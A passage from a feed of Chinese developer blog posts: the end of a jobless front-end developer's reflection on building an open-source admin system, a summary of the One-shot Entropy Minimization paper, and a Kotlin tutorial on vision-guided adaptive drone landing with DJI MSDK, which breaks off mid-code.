动态权限路由</a>，又遇到一个面试官，点评我的项目，纯静态的，没错，就是纯静态页面，模拟数据做的，最后还是挂了。于是我想着是不是可以加上后端，正好之前也接触过NodeJs，于是又是框框学，最后选了Express，打算做一个全栈管理系统，因为我对这种系统很熟悉，包括布局、页面、业务都熟悉。</p>\n<p>来到金九银十了，继续更新简历，继续投，发现岗位确实多了一些，面试也确实多了一些，但还是没有结果，我开始思考哪里的原因，可能是大专毕业，学历低，外加Gap5个多月了，也有可能是我要求高了点，因为上一家5年前入职时14k，离职也是14k，算上奖金💰一年大概有20w，新工作想找个20k以上的，因为即将临近30，后面更难，程序员30岁，35岁都是一个坎，随着一直找不到💼，开始有点否定自己，我发觉不能这样下去了，于是就继续搭建后端Node系统，好不让自己闲下来。</p>\n<p>十一回老家，装作没事人一样，在家陪了父母七八天，家里人都不知道我失业了，父母都是60多的年纪，老爸是做建筑工的，60多还爬高上低，老妈身体不好，在家串那个几厘💰一串的手串，不让她干还不愿意，说是给我攒老婆本，我三番五次拿不结婚不找对象来威胁她好让她放弃一坐低头几个小时的手工劳作，她总是美其名曰，这是我的一份“工作”。我又怎么忍心告诉他们，我失业了呢，难道让他们跟着我一起着急，一起焦虑吗，我做不到，我想大多数人都跟我一样做不到，本来就是在外地工作的“游子”，报喜不报忧已是最基本的了，于是假期结束我毅然返回上海，像“没事人”一样。</p>\n<p>10月底，我终于做出了第一版开源<a href=\"https://wladmin.cn\" rel=\"noopener nofollow\" target=\"_blank\">全栈管理系统</a>，包含前端后端，登录，权限控制，发布在了<a href=\"https://gitee.com/lyqjob/project-root\" rel=\"noopener nofollow\" target=\"_blank\">Gitee仓库</a>，这个系统参考了好几个开源管理系统，借鉴他们的页面，参考他们的实现架构，既然做出来了这个系统，就要有个名字。</p>\n<p>我给他起名叫<a href=\"https://www.wladmin.cn\" rel=\"noopener nofollow\" target=\"_blank\">WlAdmin</a>，译名“未来”不是碰瓷“蔚来”,是我对其抱有期待，期待我的“未来”，这是一个全栈管理系统，采用React + Antd + NodeJs + MySQL + Redis构建。</p>\n<p>11月，这个月应该是我最累的的一个月，随着系统初版的上线，要真正达到开源可用的企业级管理系统的功能，还有很长一段路要走，在10月底我接触到了<strong>AI编程</strong>，说实话真的很强大，赶上了字节的“Trae CN末班车”，当时还能免费用Claude Code，我想要更快的完善这个系统，于是开始在AI的帮助下，慢慢完善系统，没想到刚好用几天，突然AI变得很“笨”，网上一查才知道，国外禁止Claude Code在国内使用了，于是又下载了Cursor，免费14天，于是开始框框改造，借助AI和网上的一些架构知识，管理系统逐渐完善，作为一个前端，去学习了解后端，才发现从整体架构一个系统，真的挺不容易的，最开始我引以为豪的就是逻辑思维，知道真正从0-1搭建起来<a href=\"https://juejin.cn/post/7573912365910442026\" rel=\"noopener nofollow\" target=\"_blank\">全栈管理系统：Node.js + Express + MySQL + React + Antd</a>，才发现后端真🐮🍺。</p>\n<p>随着投简历，这个项目也算推广出去了，是有一定的人访问的，为了不影响第二天的“面试官”访问，所以线上网站不能出大的问题，本地开发好好的，部署到服务器上就是各种出问题，于是经常性的搞到一两点，搞得心力交瘁。在群里推广时有人问我“<strong>你做这个项目盈利吗，有价值吗？当今AI盛行，还用Express这种老掉牙的东西</strong>”，我竟无法反驳。11月简历投的都较其他月少了很多，当然依然是没有结果，当时一度想放弃，最后才发现，投入几个月的时间精力静下来做一个系统，一坐一整天那种，投入这么大的成本，就这么放弃有点可惜。</p>\n<p>12月，随着Gap9个月的⏰继续往前走，11月简历也都石沉大海，虽然有的进了“二面”，但依然没有结果，这个时候说不焦虑是假的，每个月上海的租金是1800，算上吃喝一个月的成本💰大概3000，也确实有点扛不动了。</p>\n<p>继续完善系统，加上了Docker部署，Docker用起来才发现真的很香，本地构建，服务器部署，当时是用了两个docker-compose.yml，一个用来启动MySQL和Redis，一个用来启动后端服务（这导致经常性一重启就无法连接数据库，之前搞到凌晨的罪魁祸首绝对有它，前几天改为了只有一个docker-compose.yml）。当时掘金网站里有很多推Monorepo架构的文章，仔细阅读发现这个确实是好东西，于是12月初就全面重构了整个系统，改为Monorepo + Turbo架构的全栈管理系统，启动、构建确实比之前快了很多，项目体积我确实没仔细看，因为这时只有两个应用，前端React，以及后端Node，后面我又采用<strong>React Native + Expo + TypeScript</strong> 构建扩展了<a href=\"https://expo.dev/accounts/liyq/projects/app-rn-ts/builds/baa8d23c-208e-4af9-8bff-6123d872cf63\" rel=\"noopener nofollow\" target=\"_blank\">App</a>以及使用<strong>Next.js + Tailwind + TypeScript</strong>构建了支持SSR以及SEO优化的<a href=\"https://www.wladmin.cn\" rel=\"noopener nofollow\" target=\"_blank\">WlAdmin｜Doc</a>，进一步扩展了知识面，而不只是停留在简历上的熟悉***，现在可惜12月份简历全都石沉大海</p>\n<h2 id=\"30岁\">30岁</h2>\n<p>上周迎来了30岁生日🎂，都说“<strong>三十而立</strong>”，可我没车没房没对象，新时代的“三无”人员😑。20年刚到上海时，Boss上都是消息，虽然大多都是“<strong>外包</strong>”，现如今，简历不是已读不回，就是没有下文，大环境愈发低迷，虽然花费几个月做出来了这个<a href=\"https://wladmin.cn/\" rel=\"noopener nofollow\" target=\"_blank\">企业级全栈管理系统</a>，但好像正如之前群里说的，“没什么太大的价值”，也就简历能添一笔。<strong>AI</strong>已经能完成80%的工作，作为一个前端，实际使用过AI，才发现AI真的已经把前端拍进了泥土里。这一年，说句不好听的，一事无成🤣，也挺失败的。系统已经完善的差不多，<strong>Web端</strong>、<strong>服务端</strong>、<strong>App端</strong>、<strong>Doc网站</strong>，差不多可以停下来思考一下未来的路了。</p>\n<h2 id=\"未来\">未来</h2>\n<p>马上2026就要到了，希望新的一年，能够迎来一份“未来“，也祝愿看到这里的朋友新的一年能收获丰硕的果实</p>\n<h2 id=\"-致谢\">🙏 致谢</h2>\n<p>感谢阅读到这里的朋友🙏，在这里厚着脸皮希望大家能够去访问一下我的<a href=\"https://wladmin.cn\" rel=\"noopener nofollow\" target=\"_blank\">开源管理系统</a>，可以去<a href=\"https://gitee.com/lyqjob/project-root\" rel=\"noopener nofollow\" target=\"_blank\">仓库</a>克隆下来耍耍，欢迎👏各位大佬提出<a href=\"https://gitee.com/lyqjob/project-root/issues\" rel=\"noopener nofollow\" target=\"_blank\">意见</a>，有问题也可以发我邮箱📮<a href=\"mailto:lyqjob@yeah.net\" rel=\"noopener nofollow\" target=\"_blank\">lyqjob@yeah.net</a>，再次感谢</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 16:47</span>&nbsp;\n<a href=\"https://www.cnblogs.com/liyq666\">香煎藕饼</a>&nbsp;\n阅读(<span id=\"post_view_count\">407</span>)&nbsp;\n评论(<span id=\"post_comment_count\">25</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "论文解读：One-shot Entropy Minimization",
      "link": "https://www.cnblogs.com/qizhou/p/19426973",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/qizhou/p/19426973\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 15:36\">\n    <span>论文解读：One-shot Entropy Minimization</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>一篇还未发表的论文，但做了大量实验对熵最小化技巧提升模型推理能力进行了探索。本文训练了13440个大型语言模型，发现熵最小化（EM）只需要一个未标记的数据和10步优化，性能提升就比<strong>RL</strong>还强。基于两个直接而简单的假设：</p>\n<ul>\n<li>\n<p>生成大型语言模型的采样过程本质上是随机的。</p>\n</li>\n<li>\n<p>正确答案的熵通常低于错误答案。</p>\n</li>\n</ul>\n<p>EM和RL有<strong>共同目标</strong>：在不添加新知识的情况下释放预训练模型的潜在潜力，都依赖于所谓“token重评级”。</p>\n<p>原文网址：<a href=\"https://arxiv.org/abs/2505.20282v4\" rel=\"noopener nofollow\" target=\"_blank\">https://arxiv.org/abs/2505.20282v4</a></p>\n<h1>方法</h1>\n<p>给定prompt <span class=\"math\">$x$</span>，生成序列<span class=\"math\">$y$</span>，最小化生成序列token级别的预测熵：</p>\n<p style=\"text-align: center;\"><span class=\"math\">$\\displaystyle L_{\\mathrm{EM}} = \\frac{1}{|y|} \\sum_{t = 1}^{|y|} H_t&nbsp;&nbsp;$</span></p>\n<p style=\"text-align: center;\"><span class=\"math\">$\\displaystyle H_t = -\\sum_{v \\in V} p_\\theta(v \\mid y_{&lt;t}, x)\\,\\log p_\\theta(v \\mid y_{&lt;t}, x)$</span></p>\n<p>训练对单个样本进行，从未标注数据中筛选（2.2节）：模型在多次采样下表现出较高的 pass@k 方差，从而对“熵”更敏感，提供更强的<strong>熵梯度</strong>信号。所谓pass@k 方差就是大模型针对同一个数据生成<span class=\"math\">$k$</span>段内容，计算<span class=\"math\">$k$</span>个内容正确与否的方差。</p>\n<h1>实验</h1>\n<p><strong>训练设置：</strong>针对特定样本，每次生成64段推理内容（即训练批量为64），用以上最小熵损失微调大模型10次。预测温度设置为0.5，学习率固定为<span class=\"math\">$2\\times 10^{-5}$</span>。</p>\n<p>表1：各种推理模型与EM的对比。</p>\n<p>图1：用了EM之后，模型生成token 的概率分布。EM使分布更右偏。</p>\n<p>图2：EM损失和评估分数随着训练的变化曲线。</p>\n<p>图3/4：不同温度对性能的影响。</p>\n<p>图5：EM和RL先后执行，性能随迭代的变化。发现RL之后应用EM会导致性能下降，而EM之后RL性能会提升。这表明EM加剧了RL引入的分配扭曲，强化了RL的“对齐税”。</p>\n<p>表2：多样本的EM与单样本的EM对比，看出多样本也没有多大优势。</p>\n<p>图6：不同学习率对推理性能的影响。</p>\n<h1>讨论与见解</h1>\n<p>单次EM增益的上限由基础模型的内在推理能力决定。在相对较弱的LLaMA-3.1-8B上，单次EM的平均准确率仅提高到24.3%，勉强超过23.6%的基线。这表明，当底层模型缺乏足够的推理能力时，最小EM优化无法完全弥补其不足。</p>\n<p>RL根据外部真实奖励调整令牌概率。这通常会促进以前低概率（尾部）代币的相对排名。即使在重新排序后，这些代币也往往占据概率分布的中间位置，需要在采样过程中选择更高的温度。因此，RL训练的模型表现出相反的趋势：性能随着采样温度的升高而提高，如图4所示。</p>\n<p>在大多数场景中，尤其是在SFT和训练最少的RL环境中，EM显著地修剪了冗余的决策路径，稳定了关键预测，验证了其作为最小但强大的优化策略的有效性和通用性。</p>\n<p>&nbsp;</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2025-12-31 15:36</span>&nbsp;\n<a href=\"https://www.cnblogs.com/qizhou\">颀周</a>&nbsp;\n阅读(<span id=\"post_view_count\">66</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "基于大疆MSDK实现的无人机视觉引导自适应降落功能",
      "link": "https://www.cnblogs.com/foury/p/19426887",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/foury/p/19426887\" id=\"cb_post_title_url\" title=\"发布于 2025-12-31 15:24\">\n    <span>基于大疆MSDK实现的无人机视觉引导自适应降落功能</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"基于大疆msdk实现的无人机视觉引导自适应降落功能\">基于大疆MSDK实现的无人机视觉引导自适应降落功能</h1>\n<h2 id=\"概述\">概述</h2>\n<p>最初需求：想要无人机在执行完航线任务后，一键落到一个指定的位置，简化人工控制。</p>\n<p>实现一套完整的无人机自主降落功能,通过虚拟摇杆控制使无人机飞向指定位置，再利用视觉识别引导无人机精确降落到具体位置。本文中采用自适应降落策略,根据高度动态调整精度要求和下降速度,以实现安全、精确的降落。</p>\n<p><strong>核心点:</strong></p>\n<ul>\n<li>虚拟摇杆导航替代FlyTo功能</li>\n<li>双轴(X/Y)位置偏移实时调整</li>\n<li>高度自适应降落策略</li>\n<li>视觉识别引导定位</li>\n<li>智能避障管理</li>\n</ul>\n<hr />\n<h2 id=\"系统架构\">系统架构</h2>\n<h3 id=\"整体流程\">整体流程</h3>\n<div class=\"mermaid\">graph TD\n    A[用户触发Return to Vehicle] --&gt; B[获取无人机GPS位置]\n    B --&gt; C[计算与目标点距离]\n    C --&gt; D[启动虚拟摇杆导航]\n    D --&gt; E[飞向目标位置 5m/s]\n    E --&gt; F{距离小于10m?}\n    F --&gt;|否| E\n    F --&gt;|是| G[开始自适应降落]\n    G --&gt; H[视觉识别系统]\n    H --&gt; I[计算X/Y偏移量]\n    I --&gt; J[更新偏移量到ViewModel]\n    J --&gt; K[自适应降落循环]\n    K --&gt; L{高度分段判断}\n    L --&gt;|高于50m| M[高空模式]\n    L --&gt;|20-50m| N[中空模式]\n    L --&gt;|5-20m| O[低空模式]\n    L --&gt;|低于5m| P[极低空模式]\n    M --&gt; Q[计算调整速度和下降速度]\n    N --&gt; Q\n    O --&gt; Q\n    P --&gt; Q\n    Q --&gt; R{偏移大于阈值2倍?}\n    R --&gt;|是| S[停止下降只调整]\n    R --&gt;|否| T[边调整边下降]\n    S --&gt; U{高度小于5m?}\n    T --&gt; U\n    U --&gt;|是| V[关闭下视避障]\n    U --&gt;|否| K\n    V --&gt; W{高度小于等于0.1m?}\n    W --&gt;|否| K\n    W --&gt;|是| X[着陆完成清理资源]\n\n</div><h2 id=\"技术实现思路\">技术实现思路</h2>\n<h3 id=\"第一步让无人机飞到目标位置\">第一步:让无人机飞到目标位置?</h3>\n<h4 id=\"问题分析\">问题分析</h4>\n<p>遥控器控制的无人机在执行完航线任务之后，飞到给定降落点（汽车或其他载具上）。最初的想法是使用DJI SDK提供的<code>FlyTo</code>功能,直接指定目标GPS坐标让无人机飞过去。但在实际测试中，发现部分机型（如M3E）并不支持<code>FlyTo</code>功能。</p>\n<p><strong>机型是否支持<code>FlyTo</code>功能参考文档</strong>：<a href=\"https://developer.dji.com/doc/mobile-sdk-tutorial/cn/tutorials/intelligent-flight.html\" rel=\"noopener nofollow\" target=\"_blank\">https://developer.dji.com/doc/mobile-sdk-tutorial/cn/tutorials/intelligent-flight.html</a></p>\n<h4 id=\"解决方案虚拟摇杆导航\">解决方案:虚拟摇杆导航</h4>\n<p>既然<code>FlyTo</code>功能不可用,那就用<strong>虚拟摇杆</strong>功能进行模拟。</p>\n<p><strong>思路:</strong></p>\n<ol>\n<li>计算当前位置到目标位置的<strong>方位角</strong>(bearing)</li>\n<li>将方位角转换为<strong>速度分量</strong>(南北/东西)</li>\n<li>持续发送虚拟摇杆指令,让无人机朝目标飞行</li>\n<li>实时监测距离,接近目标时停止</li>\n</ol>\n<p><strong>方位角计算:</strong></p>\n<pre><code class=\"language-kotlin\">private fun calculateBearing(latA: Double, lonA: Double, latB: Double, lonB: Double): Double {\n    val lat1 = Math.toRadians(latA)\n    val lat2 = Math.toRadians(latB)\n    val dLon = Math.toRadians(lonB - lonA)\n    \n    val y = Math.sin(dLon) * Math.cos(lat2)\n    val x = Math.cos(lat1) * Math.sin(lat2) - Math.sin(lat1) * Math.cos(lat2) * Math.cos(dLon)\n    \n    var bearing = Math.toDegrees(Math.atan2(y, x))\n    bearing = (bearing + 360) % 360  // 归一化到0-360度\n    \n    return bearing  // 0°=正北, 90°=正东, 180°=正南, 270°=正西\n}\n</code></pre>\n<p><strong>速度分量计算:</strong></p>\n<pre><code class=\"language-kotlin\">val bearing = calculateBearing(currentLat, currentLon, targetLat, targetLon)\nval bearingRad = Math.toRadians(bearing)\n\n// 使用GROUND坐标系(地面坐标系)\nval navParam = VirtualStickFlightControlParam().apply {\n    rollPitchCoordinateSystem = FlightCoordinateSystem.GROUND\n    verticalControlMode = VerticalControlMode.POSITION\n    yawControlMode = YawControlMode.ANGLE\n    rollPitchControlMode = RollPitchControlMode.VELOCITY\n    \n    // 将速度分解为南北和东西分量\n    pitch = NAVIGATION_SPEED * Math.cos(bearingRad)  // 南北分量(5m/s)\n    roll = NAVIGATION_SPEED * Math.sin(bearingRad)   // 东西分量(5m/s)\n    yaw = bearing  // 让机头指向目标\n    verticalThrottle = targetAlt\n}\n</code></pre>\n<ul>\n<li>GROUND坐标系是<strong>绝对方向</strong>,不受无人机朝向影响</li>\n<li>pitch控制南北,roll控制东西。</li>\n</ul>\n<p><strong>虚拟摇杆参数含义</strong>：<a href=\"https://developer.dji.com/doc/mobile-sdk-tutorial/cn/basic-introduction/basic-concepts/flight-controller.html#%E8%99%9A%E6%8B%9F%E6%91%87%E6%9D%86\" rel=\"noopener nofollow\" target=\"_blank\">https://developer.dji.com/doc/mobile-sdk-tutorial/cn/basic-introduction/basic-concepts/flight-controller.html#虚拟摇杆</a></p>\n<hr />\n<h3 id=\"第二步判断何时到达目标点上方附近\">第二步:判断何时到达目标点上方附近</h3>\n<h4 id=\"持续监测距离\">持续监测距离</h4>\n<p>每100ms检查一次当前位置与目标的距离，距离小于预期值<code>ARRIVAL_THRESHOLD</code>,就认为无人机已到达目标点上方附近，停止导航，开始降落:</p>\n<pre><code class=\"language-kotlin\">val navTask = object : Runnable {\n    override fun run() {\n        val currentLoc = getAircraftLocation()\n        val remainingDistance = calculateDistance(\n            currentLoc.latitude, currentLoc.longitude,\n            targetLat, targetLon\n        )\n        \n        if (remainingDistance &lt; ARRIVAL_THRESHOLD) {  // 10米内\n            // 到达目标,停止导航,开始降落\n            isNavigating = false\n            startDynamicAdjustment()\n        } else {\n            // 继续飞行\n            sendNavigationCommand()\n            virtualStickHandler?.postDelayed(this, 100)\n        }\n    }\n}\n</code></pre>\n<hr />\n<h3 id=\"第三步精确降落到指定点\">第三步:精确降落到指定点</h3>\n<p>无人机虽然到了目标附近(10米内),但有以下问题：</p>\n<ol>\n<li><strong>GPS精度有限</strong>(±3米),不够精确。</li>\n<li><strong>风力影响</strong>,有时候受风的影响，无人机会偏离。</li>\n</ol>\n<h4 id=\"解决方案视觉识别位置调整\">解决方案:视觉识别+位置调整</h4>\n<p><strong>工作原理:</strong></p>\n<ol>\n<li>无人机摄像头识别地面的<strong>特定图像</strong>(如二维码、标记点)</li>\n<li>视觉算法计算<strong>偏移量</strong>(X轴左右,Y轴前后,Z轴距图像距离)</li>\n<li>将偏移量传给无人机</li>\n<li>无人机调整位置,边降落边对准</li>\n</ol>\n<p><strong>数据结构:</strong></p>\n<pre><code class=\"language-kotlin\">private var xOffset: Double = 0.0  // X轴偏移(米),正=右,负=左\nprivate var yOffset: Double = 0.0  // Y轴偏移(米),正=前,负=后\nprivate var zDistance: Double = 0.0 // Z轴距离(米),距降落点高度\n</code></pre>\n<p><strong>外部接口:</strong></p>\n<pre><code class=\"language-kotlin\">// 视觉识别系统调用这些方法更新偏移量(~1Hz)\nfun setXOffset(offset: Double) { xOffset = offset }\nfun setYOffset(offset: Double) { yOffset = offset }\nfun setZDistance(distance: Double) { zDistance = distance }\n</code></pre>\n<h4 id=\"采用自适应策略一边降落一遍调整\">采用自适应策略，一边降落一遍调整</h4>\n<p><strong>关键点:</strong><br />\n在不同的高度，我们允许的偏移量阈值不同的，高度较高的时候，偏移量就算比较大也可以下降，随着高度降低，我们允许的偏移量阈值会不断缩小（要求越来越向中间对齐）</p>\n<p>真实偏移超出偏移量阈值的2倍就停止下降，只进行对齐调整；<br />\n真实偏移超出偏移量的1倍，就以0.1m/s的慢速一边降落一边调整；<br />\n在偏移量范围内，且高度&gt; 20m，以0.5m/s的速度快速下降；<br />\n在偏移量范围内，且高度在5m-20m之间，以0.2m/s的速度下降；<br />\n在偏移量范围内，且高度&lt; 5m，以0.2m/s速度下降；</p>\n<p><strong>实现:</strong></p>\n<pre><code class=\"language-kotlin\">// 1. 根据高度动态计算允许的误差\nprivate fun getOffsetThreshold(altitude: Double): Double {\n    return when {\n        altitude &gt; 50.0 -&gt; 1.0   // 高空:允许1米偏移误差\n        altitude &gt; 20.0 -&gt; 0.5   // 中空:允许0.5米偏移误差\n        altitude &gt; 5.0  -&gt; 0.3   // 低空:允许0.3米偏移误差\n        else -&gt; 0.2              // 极低空:要求0.2米精度\n    }\n}\n\n// 2. 根据高度和偏移量动态计算下降速度\nprivate fun getDescentSpeed(altitude: Double, xOffset: Double, yOffset: Double): Double {\n    val threshold = getOffsetThreshold(altitude)\n    return when {\n        xOffset &gt; threshold * 2 || yOffset &gt; threshold * 2 -&gt; 0.0  // 偏移太大:停止下降\n        xOffset &gt; threshold || yOffset &gt; threshold -&gt; 0.1          // 偏移较大:慢降\n        altitude &gt; 20.0 -&gt; 0.5                                     // 中高空:快降\n        altitude &gt; 5.0  -&gt; 0.2                                     // 低空:慢降\n        else -&gt; 0.2                                                // 极低空:极慢降\n    }\n}\n</code></pre>\n<p><strong>控制逻辑:</strong></p>\n<div class=\"mermaid\">graph TD\n    A[获取当前高度和偏移量] --&gt; B{高度判断}\n    B --&gt;|大于50m| C[偏离阈值1m]\n    B --&gt;|20-50m| D[偏离阈值0.5m]\n    B --&gt;|5-20m| E[偏离阈值0.3m]\n    B --&gt;|小于5m| F[偏离阈值0.2m]\n    C --&gt; G{偏移判断}\n    D --&gt; G\n    E --&gt; G\n    F --&gt; G\n    G --&gt;|偏移大于阈值的2倍| H[停止下降,只调整]\n    G --&gt;|偏移大于阈值| I[慢降0.1m/s并且调整]\n    G --&gt;|偏移小于阈值| J[快降并且微调]\n    H --&gt; K[发送虚拟摇杆指令]\n    I --&gt; K\n    J --&gt; K\n    K --&gt; L{高度小于等于0.1m?}\n    L --&gt;|否| A\n    L --&gt;|是| M[着陆完成]\n</div><h3 id=\"第四步处理避障降落后停桨\">第四步:处理避障，降落后停桨。</h3>\n<h4 id=\"问题下视避障会阻止降落\">问题:下视避障会阻止降落</h4>\n<p>无人机的下视避障系统会将地面识别为障碍物,在接近地面时自动停止下降，我们在高度为5m的时候关闭下视避障，落到地面后调用KeyStartAutoLanding进行停桨。<br />\n<strong>参考文档：</strong> <a href=\"https://sdk-forum.dji.net/hc/zh-cn/articles/14578693771033-%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%99%9A%E6%8B%9F%E6%91%87%E6%9D%86%E9%99%8D%E8%90%BD\" rel=\"noopener nofollow\" target=\"_blank\">https://sdk-forum.dji.net/hc/zh-cn/articles/14578693771033-如何使用虚拟摇杆降落</a></p>\n<h4 id=\"低空时关闭下视避障\">低空时关闭下视避障</h4>\n<pre><code class=\"language-kotlin\">var downwardObstacleDisabled = false  //确保关闭下视避障操作只成功执行一次\n\n// 高度&lt;5m时关闭下视避障\nif (currentAltitude &lt;= 5.0 &amp;&amp; !downwardObstacleDisabled) {\n    downwardObstacleDisabled = true\n    setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)\n}\n\n\n\n//关闭下视避障调用方法\n private fun setObstacleAvoidanceEnable(enabled: Boolean,direction: PerceptionDirection){\n        if (direction == null) {\n            Log.e(\"Perception\", \"方向参数为空，无法设置避障\")\n            return\n        }\n        PerceptionManager.getInstance().setObstacleAvoidanceEnabled(    //调用大疆MSDK方法关闭下视避障\n            enabled,\n            direction,\n            object : CommonCallbacks.CompletionCallback {\n                override fun onSuccess() {\n                    toastResult?.postValue(DJIToastResult.success(\n                        \"成功设置【${direction.name}】方向的避障为：${if (enabled) \"开启\" else \"关闭\"}\")\n                    )\n                    Log.i(\n                        \"Perception\",\n                        \"成功设置【${direction.name}】方向的避障为：${if (enabled) \"开启\" else \"关闭\"}\"\n                    )\n                }\n                override fun onFailure(error: IDJIError) {\n                    downwardObstacleDisabled = false\n                    toastResult?.postValue(DJIToastResult.failed(\n                        \"设置【${direction.name}】方向的避障失败：$error\"\n                    ))\n                    Log.e(\n                        \"Perception\",\n                        \"设置【${direction.name}】方向的避障失败：$error\"\n                    )\n                }\n            }\n        )\n    }\n</code></pre>\n<hr />\n<h3 id=\"第五步降落循环完整逻辑\">第五步:降落循环完整逻辑</h3>\n<pre><code class=\"language-kotlin\">private fun startDynamicAdjustment() {\n    isAdjusting = true\n    virtualStickHandler = Handler(Looper.getMainLooper())\n    \n    val adjustTask = object : Runnable {\n        override fun run() {\n            if (!isAdjusting) return\n            \n            // 1. 获取当前状态\n            val currentAltitude = FlightControllerKey.KeyAltitude.create().get(0.0)\n            val currentXOffsetAbs = Math.abs(xOffset)\n            val currentYOffsetAbs = Math.abs(yOffset)\n            \n            // 2. 检查是否着陆\n            if (currentAltitude &lt;= 0.1) {\n                stopLanding()\n                return\n            }\n            \n            // 3. 低空时关闭下视避障\n            if (currentAltitude &lt;= 5.0 &amp;&amp; !downwardObstacleDisabled) {\n                downwardObstacleDisabled = true\n                setObstacleAvoidanceEnable(false, PerceptionDirection.DOWNWARD)\n            }\n            \n            // 4. 计算自适应参数\n            val offsetThreshold = getOffsetThreshold(currentAltitude)\n            val descentSpeed = getDescentSpeed(currentAltitude, currentXOffsetAbs, currentYOffsetAbs)\n            \n            // 5. 构建虚拟摇杆指令\n            val adjustParam = VirtualStickFlightControlParam().apply {\n                rollPitchCoordinateSystem = FlightCoordinateSystem.BODY\n                verticalControlMode = VerticalControlMode.VELOCITY\n                rollPitchControlMode = RollPitchControlMode.VELOCITY\n                \n                // 水平调整\n                roll = if (currentXOffsetAbs &gt; offsetThreshold) {\n                    if (xOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED\n                } else 0.0\n                \n                pitch = if (currentYOffsetAbs &gt; offsetThreshold) {\n                    if (yOffset &gt; 0) ADJUSTMENT_SPEED else -ADJUSTMENT_SPEED\n                } else 0.0\n                \n                // 垂直下降\n                verticalThrottle = -descentSpeed\n            }\n            \n            // 6. 发送指令\n            VirtualStickManager.getInstance().sendVirtualStickAdvancedParam(adjustParam)\n            \n            // 7. 100ms后再次执行(10Hz)\n            virtualStickHandler?.postDelayed(this, 100)\n        }\n    }\n    \n    virtualStickHandler?.post(adjustTask)\n}\n</code></pre>\n<p><strong>以上，就实现了一整套视觉引导的自适应降落方案</strong></p>\n<h4 id=\"安全注意事项\">安全注意事项</h4>\n<p><strong>WARNING</strong></p>\n<ol>\n<li>必须在空旷、安全环境测试</li>\n<li>建议先用DJI模拟器测试</li>\n<li>视觉识别必须持续更新(~1Hz)</li>\n<li>准备好随时手动接管</li>\n</ol>\n<h4 id=\"代码\">代码</h4>\n<pre><code class=\"language-kotlin\"> /**\n     * One-key return to vehicle function (using Virtual Stick instead of FlyTo)\n     * 1. Get aircraft current location\n     * 2. Calculate distance to vehicle using Haversine formula\n     * 3. If distance &gt; 500m, reject with error\n     * 4. Use Virtual Stick to navigate to vehicle location\n     * 5. Switch to precision adjustment when close enough\n     */\n    fun returnToVehicle(callback: CommonCallbacks.CompletionCallback) {\n        // Get aircraft current location\n        val aircraftLocation = getAircraftLocation()\n        if (aircraftLocation == null || !isLocationValid(aircraftLocation.latitude, aircraftLocation.longitude)) {\n            callback.onFailure(DJICommonError.FACTORY.build(\"无法获取无人机位置信息\"))\n            return\n        }\n        \n        // Vehicle coordinates (hardcoded for now, will be replaced with API later)\n        // TODO: Replace with actual vehicle GPS coordinates from API\n        val vehicleLatitude = 22.579  // Example coordinates\n        val vehicleLongitude = 113.941 // Example coordinates\n        \n        // Calculate distance using Haversine formula\n        val distance = calculateDistance(\n            aircraftLocation.latitude,\n            aircraftLocation.longitude,\n            vehicleLatitude,\n            vehicleLongitude\n        )\n        \n        // Distance validation: reject if &gt; 500m\n        if (distance &gt; 500) {\n            callback.onFailure(DJICommonError.FACTORY.build(\n                \"距离过远: ${String.format(\"%.2f\", distance)}m, 超出 500m 限制\"\n            ))\n            return\n        }\n        \n        // Start virtual stick navigation to vehicle location\n        toastResult?.postValue(DJIToastResult.success(\"开始飞向车辆位置\"))\n        //TODO 这个targetAlt需要后期经过计算算出来。\n        navigateToTarget(vehicleLatitude, vehicleLongitude, 100.0, callback)\n    }\n    \n    \n      /**\n     * Navigate to target location using Virtual Stick\n     */\n    private fun navigateToTarget(\n        targetLat: Double,\n        targetLon: Double,\n        targetAlt: Double,\n        callback: CommonCallbacks.CompletionCallback\n    ) {\n        VirtualStickManager.getInstance().enableVirtualStick(object : CommonCallbacks.CompletionCallback {\n            override fun onSuccess() {\n                VirtualStickManager.getInstance().setVirtualStickAdvancedModeEnabled(true)\n                isNavigating = true\n                startNavigation(targetLat, targetLon, targetAlt, callback)\n            }\n            override fun onFailure(error: IDJIError) {\n                callback.onFailure(error)\n            }\n        })\n    }\n    \n     /**\n     * Start navigation loop using Virtual Stick\n     */\n    private fun startNavigation(\n        targetLat: Double,\n        targetLon: Double,\n        targetAlt: Double,\n        callback: CommonCallbacks.CompletionCallback\n    ) {\n        virtualStickHandler = Handler(Looper.getMainLooper())\n        \n        val navTask = object : Runnable {\n            override fun run() {\n                if (!isNavigating) {\n                    return\n                }\n                \n                val currentLoc = getAircraftLocation()\n                if (currentLoc == null) {\n                    virtualStickHandler?.postDelayed(this, 100)\n                    return\n                }\n                \n                // Calculate remaining distance\n                val remainingDistance = calculateDistance(\n                    currentLoc.latitude,\n                    currentLoc.longitude,\n                    targetLat,\n                    targetLon\n                )\n                println(\"targetLat:\"+targetLat+\" targetLon:\"+targetLon+\" currentLoc.latitude:\"+currentLoc.latitude+\" currentLoc.longitude:\"+currentLoc.longitude+\" remainingDistance:\"+remainingDistance)\n\n                \n                // Check if arrived\n                if (remainingDistance &lt; ARRIVAL_THRESHOLD) {\n                    // 